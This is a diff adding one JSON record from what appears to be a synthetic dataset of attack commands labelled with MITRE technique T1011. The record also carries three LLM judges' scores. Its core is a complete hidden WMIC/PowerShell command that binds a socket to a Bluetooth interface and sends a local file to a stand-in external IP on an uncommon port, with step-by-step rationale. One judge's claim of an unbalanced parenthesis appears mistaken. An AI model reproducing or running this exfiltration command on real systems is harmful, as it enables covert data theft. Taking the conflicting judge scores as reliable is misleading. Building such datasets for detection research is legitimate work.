@@ -1,0 +1,59 @@
+{
+  "technique_id": "T1011",
+  "platform": "Windows",
+  "shell": "Powershell",
+  "command": "wmic process call create \"powershell -NoProfile -WindowStyle Hidden -Command `$ifc=Get-WmiObject Win32_NetworkAdapterConfiguration | ?{ `$_.IPEnabled -and `$_.Description -like '*Bluetooth*' }; if(`$ifc){ `$ip=@(`$ifc.IPAddress | ?{ `$_ -match '^[0-9]{1,3}(\\.[0-9]{1,3}){3}$' })[0]; if(`$ip){ `$c=New-Object Net.Sockets.TcpClient; `$c.Client.Bind((New-Object Net.IPEndPoint ([Net.IPAddress]::Parse(`$ip),0))); `$c.Connect('198.51.100.77',53123); `$s=`$c.GetStream(); `$b=[IO.File]::ReadAllBytes('C:\\Users\\Public\\Documents\\sync.dat'); `$s.Write(`$b,0,`$b.Length); `$s.Close(); `$c.Close() } }\"",
+  "explanation": "Uses WMIC to spawn a hidden PowerShell that binds a TCP client to a Bluetooth PAN interface and sends a file to an external host over a high, uncommon TCP port. This aligns with T1011 by exfiltrating data via a network medium distinct from the primary LAN.",
+  "rationale_steps": [
+    "Identify a non-primary network medium (Bluetooth PAN) via WMI.",
+    "Select the interface's IPv4 address and bind the socket to that address.",
+    "Establish a TCP connection to an external host on an uncommon port.",
+    "Transmit the selected file's bytes over that alternate medium.",
+    "Avoid system-wide network changes; only the exfil process uses the alternate interface."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1011-987933e0-0b247de3",
+  "source_prompt_hash": "987933e0",
+  "timestamp_utc": "2025-09-30T08:13:32.291694Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 2,
+        "syntactic_justification": "The command has mostly correct quoting and structure but contains an unbalanced parenthesis in the TcpClient.Bind call (one closing parenthesis short), which will cause a parse/runtime error.",
+        "semantic_score": 3,
+        "semantic_justification": "The approach aligns with T1011 by attempting exfiltration via a Bluetooth-bound TCP connection, but it targets a non-routable documentation IP and assumes a Bluetooth PAN/IP is available, reducing operational plausibility.",
+        "combined_score": 2.5,
+        "confidence": 0.78,
+        "timestamp": "2025-09-30T23:41:30.659142Z"
+      },
+      {
+        "model": "claude-sonnet-4-6",
+        "syntactic_score": 4,
+        "syntactic_justification": "The command is largely well-formed with proper escaping of backtick-prefixed variables for WMIC/PowerShell nesting, balanced braces and parentheses, though the complex multi-level quoting and backtick escaping within the WMIC call create edge cases that could fail in certain shell environments.",
+        "semantic_score": 5,
+        "semantic_justification": "The command accurately implements T1011 by using WMIC to spawn a hidden PowerShell process that specifically queries for a Bluetooth PAN network adapter, binds a TCP socket to its IP address, and transmits a file to an external host over an uncommon port, correctly leveraging an alternate network medium distinct from the primary LAN channel.",
+        "combined_score": 4.5,
+        "confidence": 0.82,
+        "timestamp": "2026-02-18T21:49:54.335443Z"
+      },
+      {
+        "model": "gemini-3-flash-preview",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command uses proper WMIC syntax and correctly escapes PowerShell variables using backticks for execution within a PowerShell environment.",
+        "semantic_score": 5,
+        "semantic_justification": "The command accurately implements exfiltration by specifically binding a TCP client to a Bluetooth interface to route traffic away from the primary network gateway.",
+        "combined_score": 5.0,
+        "confidence": 1,
+        "timestamp": "2026-02-18T21:49:58.324739Z"
+      }
+    ],
+    "llm_average_syntactic": 3.667,
+    "llm_average_semantic": 4.333,
+    "llm_average_score": 4.0,
+    "llm_verdict": "uncertain",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
